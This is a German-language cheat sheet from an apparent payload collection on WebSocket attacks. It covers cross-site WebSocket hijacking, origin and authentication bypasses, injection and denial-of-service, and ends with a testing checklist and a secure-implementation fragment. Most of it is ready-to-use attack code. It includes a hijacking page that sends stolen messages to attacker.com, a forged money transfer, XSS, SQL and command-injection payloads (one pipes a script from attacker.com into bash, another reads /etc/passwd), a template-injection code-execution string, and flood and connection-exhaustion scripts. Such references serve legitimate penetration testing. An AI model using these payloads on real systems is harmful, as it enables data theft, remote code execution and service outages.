# 🔌 Spickzettel für WebSocket-Angriffe

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## 🔍 WebSocket-Grundlagen

### Handshake-Anfrage
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Handshake-Antwort
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Erkennung
```
- ws:// (unverschlüsselt)
- wss:// (TLS-verschlüsselt)
- Header Upgrade: websocket
- Im Reiter Network erscheint "101 Switching Protocols"
```

---

## 🎯 WebSocket-Schwachstellen

### 1. Cross-Site WebSocket Hijacking (CSWSH)

**Bedingung laut Vorlage:** Der Server prüft den Origin-Header nicht

```html
<!-- Seite des Angreifers -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Verbindung hergestellt; der Angreifer kann Nachrichten senden
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Daten auslesen und an den Angreifer senden
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Angriff nach dem CSRF-Prinzip:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Aktionen als Opfer ausführen
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Fehlende Origin-Prüfung

**Prüfung:**
```bash
# Mit wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Mit websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Ausnutzung:**
```javascript
// Falls der Server jede Origin akzeptiert
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Authentifizierung umgehen

**Keine Authentifizierung beim WebSocket-Verbindungsaufbau:**
```javascript
// Ohne Cookies oder Tokens verbinden
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // No auth required?
};
```

**Token in der URL (Risiko eines Datenabflusses):**
```
wss://target.com/ws?token=SECRET_TOKEN
// Token kann laut Vorlage über Protokolle oder Referrer-Header offengelegt werden
```

**Unterschiedliche Authentifizierungszustände prüfen:**
```javascript
// Mit abgelaufenem Token prüfen
// Mit verändertem Token prüfen
// Ohne Token prüfen
// Mit dem Token eines anderen Benutzers prüfen
```

---

### 4. Injection-Angriffe über WebSocket

**XSS über WebSocket:**
```javascript
// XSS-Payload senden
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL-Injection:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Command Injection:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL-Injection:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. DoS-Angriffe

**Nachrichtenflut:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Large messages
  }, 1);
};
```

**Verbindungen ausschöpfen:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Verbindung offen halten

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Daten verändern

**Nachrichten manipulieren:**
```javascript
// Nachrichten abfangen und verändern
// Mit dem Abfangen von WebSocket-Nachrichten in Burp Suite

// Original
{"action": "transfer", "amount": 10, "to": "user123"}

// Verändert
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Race Conditions (Nebenläufigkeitsfehler):**
```javascript
// Mehrere Anfragen schnell hintereinander senden
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠️ Testwerkzeuge

### Burp Suite
```
1. Proxy → WebSockets history
2. Rechtsklick → Send to Repeater
3. Nachrichten verändern und erneut senden
4. "Auto-scroll to end" aktivieren
```

### wscat (CLI)
```bash
# Installieren
npm install -g wscat

# Verbinden
wscat -c wss://target.com/ws

# Mit Headern
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Mit Origin
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Installieren
cargo install websocat

# Verbinden
websocat wss://target.com/ws

# Mit Headern
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Python-Testskript
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Payloads prüfen
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Entwicklerwerkzeuge des Browsers
```javascript
// WebSocket-Datenverkehr beobachten
// F12 → Network → WS-Filter

// Manuelle Prüfung
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Payload-Sammlung

### Authentifizierung prüfen
```json
// Keine Authentifizierung
{"action": "get_secret_data"}

// Leeres Token
{"token": "", "action": "admin_action"}

// Null-Token
{"token": null, "action": "delete_user"}
```

### XSS-Payloads
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### SQLi-Payloads
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Command Injection
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Pfadmanipulation (Path Traversal)
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Testcheckliste

```markdown
## Checkliste zur WebSocket-Sicherheit

□ WebSocket-Endpunkte ermitteln
□ Prüfung des Origin-Headers kontrollieren
□ CSWSH prüfen (Cross-Site WebSocket Hijacking)
□ Authentifizierungsanforderungen prüfen
□ Prüfen, ob Tokens sicher übertragen werden
□ Auf Injection-Schwachstellen prüfen (XSS, SQLi usw.)
□ Autorisierung prüfen (Zugriff auf Daten anderer Benutzer)
□ Auf eine Begrenzung der Anfragerate prüfen
□ Grenzen der Nachrichtengröße prüfen
□ Auf Offenlegung vertraulicher Daten prüfen
□ Verbindungsverarbeitung prüfen (Wiederverbindung)
□ Verschlüsselung prüfen (wss:// gegenüber ws://)
```

---

## 🔐 Sichere Implementierung

```javascript
// Serverseitige Origin-Prüfung
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Token-basierte Authentifizierung
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Eingaben prüfen
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

## 🔗 Verwandte Payloads

- [XSS-Payloads](./XSS.de.md)
- [SQLi-Payloads](./SQLi.de.md)
- [Command Injection](./Command-Injection.de.md)

---

**Zurück zur Payload-Sammlung:** 💉 Payload-Sammlung (im Original verlinkt; `Payloads/README.md` fehlt)

---

---

## Hinweise zur deutschen Ausgabe

> **Browser- und Serverkontext:** Eine fehlende Origin-Prüfung allein beweist noch keine CSWSH-Ausnutzbarkeit; es braucht unter anderem eine passende Authentifizierung und wirksame Aktionen beziehungsweise Daten. Der native Browser-Konstruktor akzeptiert URL und Subprotokolle, keine beliebigen eigenen HTTP-Header. Beispiele mit speziellen Headern benötigen die entsprechenden CLI-/Bibliotheksfunktionen. [MDN: WebSocket-Konstruktor](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/WebSocket).

> **Auswertung und Implementierung:** Reflexion über einen WebSocket ist nicht automatisch XSS; die Verarbeitung an der empfangenden Senke entscheidet. Tokens in URLs können in Protokollen sichtbar werden; die pauschale Referrer-Aussage ist kein Beleg für jeden WebSocket-Handshake. Die sichere Implementierung ist ein Fragment und enthält keine vollständige Sitzungs-/Autorisierungslogik. Verbindungsfluten und große Nachrichten sind keine gefahrlosen Funktionsproben. Alle Nachrichten, JSON-Strings und Payloads bleiben wörtlich erhalten und wurden nicht gesendet.
